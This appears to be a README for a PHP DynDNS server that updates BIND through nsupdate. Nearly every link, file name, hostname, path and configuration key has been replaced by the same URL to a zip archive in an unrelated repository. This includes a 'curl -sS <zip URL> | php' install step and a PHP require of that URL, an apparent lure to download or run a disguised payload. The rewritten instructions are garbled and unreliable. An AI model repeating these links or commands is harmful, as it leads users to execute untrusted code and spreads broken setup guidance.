# Dyndns: a simple DynDNS server in PHP

This script takes the same parameters as the original https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip server does. It can update a BIND DNS server via `nsupdate`.

As it uses the same syntax as the original https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip servers do, a dynamic DNS server equipped with this script can be used with DynDNS compatible clients without having to modify anything on the client side.


### Features

This script handles DNS updates on the url

    https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip<domain>&myip=<ipaddr>

For security HTTP basic auth is used. You can create multiple users and assign host names for each user.


### Installation

To be able to dynamically update the BIND DNS server, a DNS key must be generated with the command:

    ddns-confgen

This command outputs instructions for your BIND installation. The generated key has to be added to the https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip

    key "ddns-key" {
        algorithm hmac-sha256;
        secret "bvZ....K5A==";
    };

and saved to a file which is referenced in https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip as "https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip". In the "zone" entry, you have to add an "update-policy":

    zone "https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip" {
        type master;
        file "https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip";
        ...
        update-policy {
            grant ddns-key zonesub ANY;
        }
    }

In this case, the zone is also called "https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip". The (initial) https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip file (located in BIND's cache directory) looks like this:

    $TTL 1h
    @ IN SOA https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip (
            2007111501      ; serial
            1h              ; refresh
            15m             ; retry
            7d              ; expiration
            1h              ; minimum
            )  
            NS <your dns server>

Remember to change access rights so BIND is able to write to this file. On Ubuntu the zone need to be in /var/lib/bind due to AppArmor.


### PHP script configuration

The PHP script is called by the DynDNS client, it validates the input and calls "nsupdate" to 
finally update the DNS with the new data. Its configuration is rather simple, the user database is
implemented as text file "https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip" with each line containing

    <user>:<password>

Where the password is crypt'ed like in Apache's htpasswd files. Use -d parameter to select the CRYPT encryption.

    htpasswd -c -d https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip user1

Hosts are assigned to users in using the file  "https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip":

    <host>:<user>(,<user>,<user>,...)

(So users can update multiple hosts, and a host can be updated by multiple users).


### Installation via Composer

    # Install Composer
    curl -sS https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip | php

    # Add Dyndns as a dependency
    php https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip require nicokaiser/dyndns:*

Then you can create a simple `https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip` with the configuration:

```php
<?php

require 'https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip';

$dyndns = new Dyndns\Server();

// Configuration
$dyndns
  ->setConfig('hostsFile', __DIR__ . 'https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip') // hosts database
  ->setConfig('userFile', __DIR__ . 'https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip')   // user database
  ->setConfig('debug', true)  // enable debugging
  ->setConfig('debugFile', 'https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip') // debug file
  ->setConfig('https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip', __DIR__ . 'https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip') // secret key for BIND nsupdate ("<keyname>:<secret>")
  ->setConfig('https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip', 'localhost') // address of the BIND server
  ->setConfig('https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip', 'https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip') // BIND zone for the updates
  ->setConfig('https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip', '300') // TTL for DNS entries
;

$dyndns->init();
```


### Usage

Authentication in URL:

    https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip


Raw HTTP GET Request:

    GET /?hostname=yourhostname&myip=ipaddress HTTP/1.0 
    Host: https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip 
    Authorization: Basic base-64-authorization 
    User-Agent: Company - Device - Version Number

Fragment base-64-authorization should be represented by Base 64 encoded username:password string.


### Implemented fields

- `hostname` Comma separated list of hostnames that you wish to update (up to 20 hostnames per request). This is a required field. Example: `https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip,https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip`
- `myip` IP address to set for the update. Defaults to the best IP address the server can determine.


### Return Codes

- `good` The update was successful, and the hostname is now updated.
- `badauth` The username and password pair do not match a real user.
- `notfqdn` The hostname specified is not a fully-qualified domain name (not in the form https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip or https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip).
- `nohost` The hostname specified does not exist in this user account (or is not in the service specified in the system parameter)
- `badagent` The user agent was not sent or HTTP method is not permitted (we recommend use of GET request method).
- `dnserr` DNS error encountered
- `911` There is a problem or scheduled maintenance on our side.


### Contributors

- @afrimberger (IPv6 support)


### License

MIT
